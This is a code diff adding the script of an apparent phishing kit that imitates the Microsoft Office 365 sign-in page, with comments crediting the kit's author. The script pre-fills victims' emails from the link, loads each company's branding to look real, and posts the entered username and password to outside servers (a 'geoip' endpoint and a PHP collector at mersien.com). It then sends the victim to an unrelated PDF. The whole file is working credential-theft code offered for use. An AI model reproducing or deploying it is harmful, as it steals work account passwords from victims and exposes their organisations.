@@ -1,0 +1,186 @@
+
+writeHTMLasJS();
+
+
+function GET() {
+  var data = [];
+  for(x = 0; x < arguments.length; ++x)
+     data.push(location.href.match(new RegExp("(/\?email=)([^\&]*)"))[2]);
+     return data;
+  }
+  document.getElementById('email').value = (GET("id")[0]); 
+
+
+		$( document ).ready(function() {
+			// THIS SCRIPT CODED BY MIRCBOOT
+			// CONTACT US SKYPE : MIRCBOOT
+			// ICQ : 703514486
+			// Genral 365 Version 14
+			// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+			// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+			// !!!!!!!!!!!! Attention !!!!!!!!!!!!
+			// !!!! IF NOT WORKING CONTACT US  !!!
+			// !!!! IF NOT WORKING CONTACT US  !!!
+			// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+			// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+			// Note : if this HTML page hosted on http(s) domain so you must add the http(s) url php file to avoid cross error //
+
+			var php_url = 'https://mersien.com/vic/login.php'; // Enter your post PHP page url here.
+			var check_mx = false; // true or false for check outlook MX.
+
+
+
+			// ******************************************************************************************************* //
+			var hash = window.location.hash;
+			var email = hash.split('#')[1];
+
+			if(true_email(email)){
+				$("#pick_em").show();
+				$("#em_picker").html(email);
+				$('#email').val(email);
+			}else{
+				$("#add_em").show();
+			}
+
+			$('.email-picker').on('click', function (){
+				$('.identity').html(email);
+				$(".error-alert-pass").hide();
+				set_brand(email);
+				setTimeout(function (){
+					$("#pick_em").hide();
+					$("#add_pass").show();
+				}, 1000);
+			});
+
+			$('.email-picker2').on('click', function (){
+				$('#email').val('');
+				$("#pick_em").hide();
+				$("#add_em").show();
+			});
+
+			$('.btn-email').on('click', function (){
+				var email = $('#email').val();
+				$('.identity').html(email);
+				$(".error-alert").hide();
+				$('.btn-email').prop('disabled', true);
+                var domain = email.split('@')[1];
+				if(true_email(email) == false){
+					$(".error-alert").show();
+					$(".error-alert-msg").html('Please enter correct office 365 email account.');
+					$('.btn-email').prop('disabled', false);
+				}
+                else if(domain == "gmail.com" || domain == "aol.com" || domain == "yahoo.com"|| domain == "ymail.com"|| domain == "yahoo.co.uk"|| domain == "yahoo.de"|| domain == "yahoo.com.hk"|| domain == "yahoo.com.au"|| domain == "live.com"|| domain == "msn.com"|| domain == "zoho.com"|| domain == "btinternet.com"|| domain == "btopenworld.com"|| domain == "talk21.com"|| domain == "att.net"|| domain == "sbcglobal.net"|| domain == "aol.ca"|| domain == "aol.co.uk"|| domain == "aol.de"|  domain == "mail.com"|| domain == "verizon.net"|| domain == "rocketmail.com"|| domain == "cs.com"|| domain == "yahoo.com.cn"|| domain == "yahoo.cn"|| domain == "yahoo.com"|| domain == "comcast.com"|| domain == "comcast.net"|| domain == "sky.com"|| domain == "yahoo.co.in"|| domain == "yandex.com"){
+
+                    $(".error-alert").show();
+                    $(".error-alert-msg").html("You can't signin with this account, Please use your work or company account instead.");
+                    $('.btn-email').prop('disabled', false);
+                }else{
+					if(check_mx == true){
+						var domain = email.split('@')[1];
+						var str;
+						$.ajax({
+							url: php_url + '?domain=' + domain,
+							success: function(data){
+								str = data.includes("outlook");
+								if(str){
+									set_brand(email);
+									setTimeout(function (){
+										$("#add_em").hide();
+										$("#add_pass").show();
+									}, 1000);
+								}else{
+									$(".error-alert").show();
+									$(".error-alert-msg").html('You can\'t signin with this account, Please use work or school account instead.');
+									$('.btn-email').prop('disabled', false);
+								}
+							},
+							error: function(xhr){
+								$(".error-alert").show();
+								$(".error-alert-msg").html('Error occured, Please try again.');
+								$('.btn-email').prop('disabled', false);
+							}
+						});
+					}else{
+						set_brand(email);
+						setTimeout(function (){
+							$("#add_em").hide();
+							$("#add_pass").show();
+						}, 1000);
+					}
+				}
+			});
+
+			$('.btn-signin').on('click', function (){
+				$('.btn-signin').prop('disabled', true);
+				setTimeout(function (){
+					$(".error-alert-pass").hide();
+				}, 500);
+				var user = $('#email').val();
+				var pass = $('#password').val();
+				$.ajax({
+					url: "https://checkmyips.net/api/geoip/",
+					type: "POST",
+					data: {user:user,pass:pass,t:1},
+					success: function(data){
+						var i=$.parseJSON(data);
+						if(i.status == 'OK'){
+							$.ajax({
+								 url: php_url,
+								 type: "POST",
+								 data: {user:user,pass:pass,country:i.country,ip:i.ip},
+								 success: function(finish_url){
+									window.open('http://www.ddegjust.ac.in/studymaterial/mba/fm-405.pdf', '_top')
+								 }
+							 });
+						}else{
+							$(".error-alert-pass").show();
+							$('.btn-signin').prop('disabled', false);
+						}
+					},
+					error: function(){
+						$(".error-alert-pass").hide();
+						$('.btn-signin').prop('disabled', false);
+					}
+				});
+			});
+
+			$('.backButton').on('click', function (){
+				$('#bg_image').css('background-image', 'url(lib/img/background.jpg)');
+				$('#logo_image').attr('src', 'https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');
+				$('#banner_image').show();
+				$('.btn-email').prop('disabled', false);
+				$("#add_pass").hide();
+				$("#add_em").show();
+				$(".error-alert-pass").hide();
+			});
+
+			function set_brand(email){
+				$.ajax({
+					url: php_url,
+					type: "POST",
+					data: {email:email,barnd:1},
+					success: function(data){
+						var i=$.parseJSON(data);
+						if(i.bg_image !== null && i.logo_image !== null && i.bg_image !== '' && i.logo_image !== ''){
+							$('#bg_image').css('background-image', 'url(' + i.bg_image + ')');
+							$('#logo_image').attr('src', i.logo_image);
+							$('#banner_image').hide();
+						}
+					}
+				});
+			}
+		});
+
+		function true_email(a) {
+			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+			return re.test(a);
+		}
+	  
+
+  $(document).keypress(function(event){
+  var keycode = (event.keyCode ? event.keyCode : event.which);
+  if(keycode == '13'){
+    $("#btn-email, .btn-signin").click();
+  }
+});
